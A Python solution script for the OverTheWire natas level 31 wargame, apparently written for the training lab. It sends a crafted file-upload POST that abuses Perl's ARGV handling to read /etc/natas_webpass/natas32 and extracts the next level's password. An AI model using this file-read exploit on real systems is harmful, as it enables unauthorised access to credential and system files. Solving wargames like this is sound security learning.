import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '31'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas31', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload_file = {'file': ('a.csv', 'a, b\nc, d')} 
    payload = {'file':'ARGV'}
    r = requests.post('http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32', data=payload, files=payload_file, auth=auth)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
